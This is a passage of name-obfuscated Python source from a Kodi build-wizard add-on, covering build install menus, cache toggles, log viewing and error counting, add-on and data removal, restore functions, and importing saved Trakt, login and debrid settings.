		OOO000O000OOOO000 .append ((THEME3 %'Clear Addon %s Data'%O0OO0OO0O0O0000O0 ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,OO0O0OO0OO00O0O0O ,O0OOO000O0OO0O00O )))#line:4128
	elif O0O00O0OO00OOO0OO =='install':#line:4129
		OOO000O000OOOO000 =[]#line:4130
		O0OOO000O0OO0O00O =urllib .quote_plus (OO00OO0OO000O00OO )#line:4131
		OOO000O000OOOO000 .append ((THEME2 %OO00OO0OO000O00OO ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,O0OOO000O0OO0O00O )))#line:4132
		OOO000O000OOOO000 .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,O0OOO000O0OO0O00O )))#line:4133
		OOO000O000OOOO000 .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,O0OOO000O0OO0O00O )))#line:4134
		OOO000O000OOOO000 .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,O0OOO000O0OO0O00O )))#line:4135
		OOO000O000OOOO000 .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,O0OOO000O0OO0O00O )))#line:4136
	OOO000O000OOOO000 .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4137
	return OOO000O000OOOO000 #line:4138
def toggleCache (OO0000OO0000OOO00 ):#line:4140
	O00OO00O0OO00OO00 =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4141
	O00O0OOOO0OOO0000 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4142
	if OO0000OO0000OOO00 in ['true','false']:#line:4143
		for OO0O00O000O000O0O in O00OO00O0OO00OO00 :#line:4144
			wiz .setS (OO0O00O000O000O0O ,OO0000OO0000OOO00 )#line:4145
	else :#line:4146
		if not OO0000OO0000OOO00 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4147
			try :#line:4148
				OO0O00O000O000O0O =O00O0OOOO0OOO0000 [O00OO00O0OO00OO00 .index (OO0000OO0000OOO00 )]#line:4149
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OO0O00O000O000O0O ))#line:4150
			except :#line:4151
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OO0000OO0000OOO00 ))#line:4152
		else :#line:4153
			O000O0O0000OO0000 ='true'if wiz .getS (OO0000OO0000OOO00 )=='false'else 'false'#line:4154
			wiz .setS (OO0000OO0000OOO00 ,O000O0O0000OO0000 )#line:4155
def playVideo (O00OOO000OO00OOO0 ):#line:4157
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%O00OOO000OO00OOO0 )#line:4158
	if 'watch?v='in O00OOO000OO00OOO0 :#line:4159
		OO0O00OO00OOO000O ,O00O000O00O0O000O =O00OOO000OO00OOO0 .split ('?')#line:4160
		OOO0O0OO0O0OOOO0O =O00O000O00O0O000O .split ('&')#line:4161
		for O00OOOO00OOO0000O in OOO0O0OO0O0OOOO0O :#line:4162
			if O00OOOO00OOO0000O .startswith ('v='):#line:4163
				O00OOO000OO00OOO0 =O00OOOO00OOO0000O [2 :]#line:4164
				break #line:4165
			else :continue #line:4166
	elif 'embed'in O00OOO000OO00OOO0 or 'youtu.be'in O00OOO000OO00OOO0 :#line:4167
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%O00OOO000OO00OOO0 )#line:4168
		OO0O00OO00OOO000O =O00OOO000OO00OOO0 .split ('/')#line:4169
		if len (OO0O00OO00OOO000O [-1 ])>5 :#line:4170
			O00OOO000OO00OOO0 =OO0O00OO00OOO000O [-1 ]#line:4171
		elif len (OO0O00OO00OOO000O [-2 ])>5 :#line:4172
			O00OOO000OO00OOO0 =OO0O00OO00OOO000O [-2 ]#line:4173
	wiz .log ("YouTube URL: %s"%O00OOO000OO00OOO0 )#line:4174
	yt .PlayVideo (O00OOO000OO00OOO0 )#line:4175
def viewLogFile ():#line:4177
	OOO0O00000OOO00O0 =wiz .Grab_Log (True )#line:4178
	O00OO0O0O0OOOO0O0 =wiz .Grab_Log (True ,True )#line:4179
	OO00OOO000O0OOO00 =0 ;OOO0O0OOO0000O0O0 =OOO0O00000OOO00O0 #line:4180
	if not O00OO0O0O0OOOO0O0 ==False and not OOO0O00000OOO00O0 ==False :#line:4181
		OO00OOO000O0OOO00 =DIALOG .select (ADDONTITLE ,["View %s"%OOO0O00000OOO00O0 .replace (LOG ,""),"View %s"%O00OO0O0O0OOOO0O0 .replace (LOG ,"")])#line:4182
		if OO00OOO000O0OOO00 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4183
	elif OOO0O00000OOO00O0 ==False and O00OO0O0O0OOOO0O0 ==False :#line:4184
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4185
		return #line:4186
	elif not OOO0O00000OOO00O0 ==False :OO00OOO000O0OOO00 =0 #line:4187
	elif not O00OO0O0O0OOOO0O0 ==False :OO00OOO000O0OOO00 =1 #line:4188
	OOO0O0OOO0000O0O0 =OOO0O00000OOO00O0 if OO00OOO000O0OOO00 ==0 else O00OO0O0O0OOOO0O0 #line:4190
	OOO000O0OO000000O =wiz .Grab_Log (False )if OO00OOO000O0OOO00 ==0 else wiz .Grab_Log (False ,True )#line:4191
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,OOO0O0OOO0000O0O0 ),OOO000O0OO000000O )#line:4193
def errorChecking (log =None ,count =None ,all =None ):#line:4195
	if log ==None :#line:4196
		OOO00O0OO0O00O0OO =wiz .Grab_Log (True )#line:4197
		O0O00O00OOOOOO000 =wiz .Grab_Log (True ,True )#line:4198
		if not O0O00O00OOOOOO000 ==False and not OOO00O0OO0O00O0OO ==False :#line:4199
			OO00O00O0OO0OO00O =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(OOO00O0OO0O00O0OO .replace (LOG ,""),errorChecking (OOO00O0OO0O00O0OO ,True ,True )),"View %s: %s error(s)"%(O0O00O00OOOOOO000 .replace (LOG ,""),errorChecking (O0O00O00OOOOOO000 ,True ,True ))])#line:4200
			if OO00O00O0OO0OO00O ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4201
		elif OOO00O0OO0O00O0OO ==False and O0O00O00OOOOOO000 ==False :#line:4202
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4203
			return #line:4204
		elif not OOO00O0OO0O00O0OO ==False :OO00O00O0OO0OO00O =0 #line:4205
		elif not O0O00O00OOOOOO000 ==False :OO00O00O0OO0OO00O =1 #line:4206
		log =OOO00O0OO0O00O0OO if OO00O00O0OO0OO00O ==0 else O0O00O00OOOOOO000 #line:4207
	if log ==False :#line:4208
		if count ==None :#line:4209
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4210
			return False #line:4211
		else :#line:4212
			return 0 #line:4213
	else :#line:4214
		if os .path .exists (log ):#line:4215
			OO0O0OOOOOOOO00O0 =open (log ,mode ='r');O00O00O0O000OOOO0 =OO0O0OOOOOOOO00O0 .read ().replace ('\n','').replace ('\r','');OO0O0OOOOOOOO00O0 .close ()#line:4216
			O00OO000000000000 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (O00O00O0O000OOOO0 )#line:4217
			if not count ==None :#line:4218
				if all ==None :#line:4219
					O0000OOO00OOO0O0O =0 #line:4220
					for OO0000O0O0OO00000 in O00OO000000000000 :#line:4221
						if ADDON_ID in OO0000O0O0OO00000 :O0000OOO00OOO0O0O +=1 #line:4222
					return O0000OOO00OOO0O0O #line:4223
				else :return len (O00OO000000000000 )#line:4224
			if len (O00OO000000000000 )>0 :#line:4225
				O0000OOO00OOO0O0O =0 ;O0O00OOO000O0OOOO =""#line:4226
				for OO0000O0O0OO00000 in O00OO000000000000 :#line:4227
					if all ==None and not ADDON_ID in OO0000O0O0OO00000 :continue #line:4228
					else :#line:4229
						O0000OOO00OOO0O0O +=1 #line:4230
						O0O00OOO000O0OOOO +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(O0000OOO00OOO0O0O ,OO0000O0O0OO00000 .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4231
				if O0000OOO00OOO0O0O >0 :#line:4232
					wiz .TextBox (ADDONTITLE ,O0O00OOO000O0OOOO )#line:4233
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4234
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4235
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4236
ACTION_PREVIOUS_MENU =10 #line:4238
ACTION_NAV_BACK =92 #line:4239
ACTION_MOVE_LEFT =1 #line:4240
ACTION_MOVE_RIGHT =2 #line:4241
ACTION_MOVE_UP =3 #line:4242
ACTION_MOVE_DOWN =4 #line:4243
ACTION_MOUSE_WHEEL_UP =104 #line:4244
ACTION_MOUSE_WHEEL_DOWN =105 #line:4245
ACTION_MOVE_MOUSE =107 #line:4246
ACTION_SELECT_ITEM =7 #line:4247
ACTION_BACKSPACE =110 #line:4248
ACTION_MOUSE_LEFT_CLICK =100 #line:4249
ACTION_MOUSE_LONG_CLICK =108 #line:4250
def LogViewer (default =None ):#line:4252
	class OOOOOO00000OO0O0O (xbmcgui .WindowXMLDialog ):#line:4253
		def __init__ (OOOOO00OO00OOO00O ,*OOO0OOOOOOO0O0OO0 ,**OOOO0O0000O0O000O ):#line:4254
			OOOOO00OO00OOO00O .default =OOOO0O0000O0O000O ['default']#line:4255
		def onInit (OO00OO00000OO000O ):#line:4257
			OO00OO00000OO000O .title =101 #line:4258
			OO00OO00000OO000O .msg =102 #line:4259
			OO00OO00000OO000O .scrollbar =103 #line:4260
			OO00OO00000OO000O .upload =201 #line:4261
			OO00OO00000OO000O .kodi =202 #line:4262
			OO00OO00000OO000O .kodiold =203 #line:4263
			OO00OO00000OO000O .wizard =204 #line:4264
			OO00OO00000OO000O .okbutton =205 #line:4265
			OO0OO0O000O0O0OO0 =open (OO00OO00000OO000O .default ,'r')#line:4266
			OO00OO00000OO000O .logmsg =OO0OO0O000O0O0OO0 .read ()#line:4267
			OO0OO0O000O0O0OO0 .close ()#line:4268
			OO00OO00000OO000O .titlemsg ="%s: %s"%(ADDONTITLE ,OO00OO00000OO000O .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4269
			OO00OO00000OO000O .showdialog ()#line:4270
		def showdialog (O0O0O000OO0O00O0O ):#line:4272
			O0O0O000OO0O00O0O .getControl (O0O0O000OO0O00O0O .title ).setLabel (O0O0O000OO0O00O0O .titlemsg )#line:4273
			O0O0O000OO0O00O0O .getControl (O0O0O000OO0O00O0O .msg ).setText (wiz .highlightText (O0O0O000OO0O00O0O .logmsg ))#line:4274
			O0O0O000OO0O00O0O .setFocusId (O0O0O000OO0O00O0O .scrollbar )#line:4275
		def onClick (OO0OO0O00OO000O00 ,O00OO0OO000O00OOO ):#line:4277
			if O00OO0OO000O00OOO ==OO0OO0O00OO000O00 .okbutton :OO0OO0O00OO000O00 .close ()#line:4278
			elif O00OO0OO000O00OOO ==OO0OO0O00OO000O00 .upload :OO0OO0O00OO000O00 .close ();uploadLog .Main ()#line:4279
			elif O00OO0OO000O00OOO ==OO0OO0O00OO000O00 .kodi :#line:4280
				O0000000OO00OOO0O =wiz .Grab_Log (False )#line:4281
				OOO0O0000OO0000O0 =wiz .Grab_Log (True )#line:4282
				if O0000000OO00OOO0O ==False :#line:4283
					OO0OO0O00OO000O00 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4284
					OO0OO0O00OO000O00 .getControl (OO0OO0O00OO000O00 .msg ).setText ("Log File Does Not Exists!")#line:4285
				else :#line:4286
					OO0OO0O00OO000O00 .titlemsg ="%s: %s"%(ADDONTITLE ,OOO0O0000OO0000O0 .replace (LOG ,''))#line:4287
					OO0OO0O00OO000O00 .getControl (OO0OO0O00OO000O00 .title ).setLabel (OO0OO0O00OO000O00 .titlemsg )#line:4288
					OO0OO0O00OO000O00 .getControl (OO0OO0O00OO000O00 .msg ).setText (wiz .highlightText (O0000000OO00OOO0O ))#line:4289
					OO0OO0O00OO000O00 .setFocusId (OO0OO0O00OO000O00 .scrollbar )#line:4290
			elif O00OO0OO000O00OOO ==OO0OO0O00OO000O00 .kodiold :#line:4291
				O0000000OO00OOO0O =wiz .Grab_Log (False ,True )#line:4292
				OOO0O0000OO0000O0 =wiz .Grab_Log (True ,True )#line:4293
				if O0000000OO00OOO0O ==False :#line:4294
					OO0OO0O00OO000O00 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4295
					OO0OO0O00OO000O00 .getControl (OO0OO0O00OO000O00 .msg ).setText ("Log File Does Not Exists!")#line:4296
				else :#line:4297
					OO0OO0O00OO000O00 .titlemsg ="%s: %s"%(ADDONTITLE ,OOO0O0000OO0000O0 .replace (LOG ,''))#line:4298
					OO0OO0O00OO000O00 .getControl (OO0OO0O00OO000O00 .title ).setLabel (OO0OO0O00OO000O00 .titlemsg )#line:4299
					OO0OO0O00OO000O00 .getControl (OO0OO0O00OO000O00 .msg ).setText (wiz .highlightText (O0000000OO00OOO0O ))#line:4300
					OO0OO0O00OO000O00 .setFocusId (OO0OO0O00OO000O00 .scrollbar )#line:4301
			elif O00OO0OO000O00OOO ==OO0OO0O00OO000O00 .wizard :#line:4302
				O0000000OO00OOO0O =wiz .Grab_Log (False ,False ,True )#line:4303
				OOO0O0000OO0000O0 =wiz .Grab_Log (True ,False ,True )#line:4304
				if O0000000OO00OOO0O ==False :#line:4305
					OO0OO0O00OO000O00 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4306
					OO0OO0O00OO000O00 .getControl (OO0OO0O00OO000O00 .msg ).setText ("Log File Does Not Exists!")#line:4307
				else :#line:4308
					OO0OO0O00OO000O00 .titlemsg ="%s: %s"%(ADDONTITLE ,OOO0O0000OO0000O0 .replace (ADDONDATA ,''))#line:4309
					OO0OO0O00OO000O00 .getControl (OO0OO0O00OO000O00 .title ).setLabel (OO0OO0O00OO000O00 .titlemsg )#line:4310
					OO0OO0O00OO000O00 .getControl (OO0OO0O00OO000O00 .msg ).setText (wiz .highlightText (O0000000OO00OOO0O ))#line:4311
					OO0OO0O00OO000O00 .setFocusId (OO0OO0O00OO000O00 .scrollbar )#line:4312
		def onAction (O000OO00O00O000O0 ,O0O0OOO00O00OO000 ):#line:4314
			if O0O0OOO00O00OO000 ==ACTION_PREVIOUS_MENU :O000OO00O00O000O0 .close ()#line:4315
			elif O0O0OOO00O00OO000 ==ACTION_NAV_BACK :O000OO00O00O000O0 .close ()#line:4316
	if default ==None :default =wiz .Grab_Log (True )#line:4317
	O0OOOO0O0O0OO0OOO =OOOOOO00000OO0O0O ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4318
	O0OOOO0O0O0OO0OOO .doModal ()#line:4319
	del O0OOOO0O0O0OO0OOO #line:4320
def removeAddon (O0O00OOO0O0OOOOOO ,OOOO00000O0O0000O ,over =False ):#line:4322
	if not over ==False :#line:4323
		O0000OO000000OO00 =1 #line:4324
	else :#line:4325
		O0000OO000000OO00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOO00000O0O0000O ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,O0O00OOO0O0OOOOOO ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4326
	if O0000OO000000OO00 ==1 :#line:4327
		O0O0000OO0OO00OOO =os .path .join (ADDONS ,O0O00OOO0O0OOOOOO )#line:4328
		wiz .log ("Removing Addon %s"%O0O00OOO0O0OOOOOO )#line:4329
		wiz .cleanHouse (O0O0000OO0OO00OOO )#line:4330
		xbmc .sleep (1000 )#line:4331
		try :shutil .rmtree (O0O0000OO0OO00OOO )#line:4332
		except Exception as OO0000000OO0O0O00 :wiz .log ("Error removing %s"%O0O00OOO0O0OOOOOO ,xbmc .LOGNOTICE )#line:4333
		removeAddonData (O0O00OOO0O0OOOOOO ,OOOO00000O0O0000O ,over )#line:4334
	if over ==False :#line:4335
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,OOOO00000O0O0000O ))#line:4336
def removeAddonData (OO0O000OOOO0OOOOO ,name =None ,over =False ):#line:4338
	if OO0O000OOOO0OOOOO =='all':#line:4339
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4340
			wiz .cleanHouse (ADDOND )#line:4341
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4342
	elif OO0O000OOOO0OOOOO =='uninstalled':#line:4343
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4344
			O0O0O00O0OO000000 =0 #line:4345
			for O0000OOOO00000O00 in glob .glob (os .path .join (ADDOND ,'*')):#line:4346
				OO00OOO0OO0O000OO =O0000OOOO00000O00 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4347
				if OO00OOO0OO0O000OO in EXCLUDES :pass #line:4348
				elif os .path .exists (os .path .join (ADDONS ,OO00OOO0OO0O000OO )):pass #line:4349
				else :wiz .cleanHouse (O0000OOOO00000O00 );O0O0O00O0OO000000 +=1 ;wiz .log (O0000OOOO00000O00 );shutil .rmtree (O0000OOOO00000O00 )#line:4350
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0O0O00O0OO000000 ))#line:4351
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4352
	elif OO0O000OOOO0OOOOO =='empty':#line:4353
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4354
			O0O0O00O0OO000000 =wiz .emptyfolder (ADDOND )#line:4355
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0O0O00O0OO000000 ))#line:4356
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4357
	else :#line:4358
		OOO00OOO00OO00O0O =os .path .join (USERDATA ,'addon_data',OO0O000OOOO0OOOOO )#line:4359
		if OO0O000OOOO0OOOOO in EXCLUDES :#line:4360
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4361
		elif os .path .exists (OOO00OOO00OO00O0O ):#line:4362
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0O000OOOO0OOOOO ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4363
				wiz .cleanHouse (OOO00OOO00OO00O0O )#line:4364
				try :#line:4365
					shutil .rmtree (OOO00OOO00OO00O0O )#line:4366
				except :#line:4367
					wiz .log ("Error deleting: %s"%OOO00OOO00OO00O0O )#line:4368
			else :#line:4369
				wiz .log ('Addon data for %s was not removed'%OO0O000OOOO0OOOOO )#line:4370
	wiz .refresh ()#line:4371
def restoreit (O0O000OO000O0O0O0 ):#line:4373
	if O0O000OO000O0O0O0 =='build':#line:4374
		O000O0OO0OO00OOOO =freshStart ('restore')#line:4375
		if O000O0OO0OO00OOOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4376
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4377
		wiz .skinToDefault ()#line:4378
	wiz .restoreLocal (O0O000OO000O0O0O0 )#line:4379
def restoreextit (O00O000OO0O000000 ):#line:4381
	if O00O000OO0O000000 =='build':#line:4382
		OOOO000O0OO00OO00 =freshStart ('restore')#line:4383
		if OOOO000O0OO00OO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4384
	wiz .restoreExternal (O00O000OO0O000000 )#line:4385
def buildInfo (OOO00OOO0O0O0OOOO ):#line:4387
	if wiz .workingURL (SPEEDFILE )==True :#line:4388
		if wiz .checkBuild (OOO00OOO0O0O0OOOO ,'url'):#line:4389
			OOO00OOO0O0O0OOOO ,OOO0O0OO000O0OOOO ,O00OO0O0OO0O0000O ,O0O0O0O00OO00O000 ,OO00000O0O0OO0O0O ,OO00OO0OO000O0OOO ,OOOOO0O0000OO0000 ,O000OO000O0O000O0 ,OOOOO00O0OO0O0O00 ,O0OO0OO0O000O000O ,O0O0OO0O000O00O00 =wiz .checkBuild (OOO00OOO0O0O0OOOO ,'all')#line:4390
			O0OO0OO0O000O000O ='Yes'if O0OO0OO0O000O000O .lower ()=='yes'else 'No'#line:4391
			OO0000OOOO0O00O0O ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO00OOO0O0O0OOOO )#line:4392
			OO0000OOOO0O00O0O +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO0O0OO000O0OOOO )#line:4393
			if not OO00OO0OO000O0OOO =="http://":#line:4394
				O0000O0000000OO00 =wiz .themeCount (OOO00OOO0O0O0OOOO ,False )#line:4395
				OO0000OOOO0O00O0O +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (O0000O0000000OO00 ))#line:4396
			OO0000OOOO0O00O0O +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO00000O0O0OO0O0O )#line:4397
			OO0000OOOO0O00O0O +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OO0OO0O000O000O )#line:4398
			OO0000OOOO0O00O0O +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O0OO0O000O00O00 )#line:4399
			wiz .TextBox (ADDONTITLE ,OO0000OOOO0O00O0O )#line:4400
		else :wiz .log ("Invalid Build Name!")#line:4401
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4402
def buildVideo (OO00OO0O000O0000O ):#line:4404
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4405
	if wiz .workingURL (SPEEDFILE )==True :#line:4406
		O0OO000OO0O0O00O0 =wiz .checkBuild (OO00OO0O000O0000O ,'preview')#line:4407
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%OO00OO0O000O0000O )#line:4408
		if O0OO000OO0O0O00O0 and not O0OO000OO0O0O00O0 =='http://':playVideo (O0OO000OO0O0O00O0 )#line:4409
		else :wiz .log ("[%s]Unable to find url for video preview"%OO00OO0O000O0000O )#line:4410
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4411
def dependsList (O0OO000O000O00O00 ):#line:4413
	OO0O0O0000OOO0O00 =os .path .join (ADDONS ,O0OO000O000O00O00 ,'addon.xml')#line:4414
	if os .path .exists (OO0O0O0000OOO0O00 ):#line:4415
		OOO00OOOOOO00O0OO =open (OO0O0O0000OOO0O00 ,mode ='r');OOO000O0O00O000O0 =OOO00OOOOOO00O0OO .read ();OOO00OOOOOO00O0OO .close ();#line:4416
		OOOO0000O0000OO00 =wiz .parseDOM (OOO000O0O00O000O0 ,'import',ret ='addon')#line:4417
		OOO0OOOO0O00OO00O =[]#line:4418
		for O0OOO000O00OO0000 in OOOO0000O0000OO00 :#line:4419
			if not 'xbmc.python'in O0OOO000O00OO0000 :#line:4420
				OOO0OOOO0O00OO00O .append (O0OOO000O00OO0000 )#line:4421
		return OOO0OOOO0O00OO00O #line:4422
	return []#line:4423
def manageSaveData (OOO00OOO000OO0OOO ):#line:4425
	if OOO00OOO000OO0OOO =='import':#line:4426
		O0OOOO0OO0O00OOOO =os .path .join (ADDONDATA ,'temp')#line:4427
		if not os .path .exists (O0OOOO0OO0O00OOOO ):os .makedirs (O0OOOO0OO0O00OOOO )#line:4428
		O000OO00OOO00000O =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4429
		if not O000OO00OOO00000O .endswith ('.zip'):#line:4430
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4431
			return #line:4432
		O0OO0O00OO0O0O000 =os .path .join (MYBUILDS ,'SaveData.zip')#line:4433
		O000OO0OOOOO0O0OO =xbmcvfs .copy (O000OO00OOO00000O ,O0OO0O00OO0O0O000 )#line:4434
		wiz .log ("%s"%str (O000OO0OOOOO0O0OO ))#line:4435
		extract .all (xbmc .translatePath (O0OO0O00OO0O0O000 ),O0OOOO0OO0O00OOOO )#line:4436
		O0O0OOO0O00OOO0O0 =os .path .join (O0OOOO0OO0O00OOOO ,'trakt')#line:4437
		O00OO0OOO0O000OOO =os .path .join (O0OOOO0OO0O00OOOO ,'login')#line:4438
		OO0OO0000OO00OOO0 =os .path .join (O0OOOO0OO0O00OOOO ,'debrid')#line:4439
		O0OO0O0O0O00OOO0O =0 #line:4440
		if os .path .exists (O0O0OOO0O00OOO0O0 ):#line:4441
			O0OO0O0O0O00OOO0O +=1 #line:4442
			OO0O0000O0O0OOO0O =os .listdir (O0O0OOO0O00OOO0O0 )#line:4443
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4444
			for O00OO00O000O0OO00 in OO0O0000O0O0OOO0O :#line:4445
				O0O0O000OOO000000 =os .path .join (traktit .TRAKTFOLD ,O00OO00O000O0OO00 )#line:4446
				O00O0OO0O00OOO0OO =os .path .join (O0O0OOO0O00OOO0O0 ,O00OO00O000O0OO00 )#line:4447
				if os .path .exists (O0O0O000OOO000000 ):#line:4448
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O00OO00O000O0OO00 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4449
					else :os .remove (O0O0O000OOO000000 )#line:4450
				shutil .copy (O00O0OO0O00OOO0OO ,O0O0O000OOO000000 )#line:4451
			traktit .importlist ('all')#line:4452
			traktit .traktIt ('restore','all')#line:4453
		if os .path .exists (O00OO0OOO0O000OOO ):#line:4454
			O0OO0O0O0O00OOO0O +=1 #line:4455
			OO0O0000O0O0OOO0O =os .listdir (O00OO0OOO0O000OOO )#line:4456
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4457
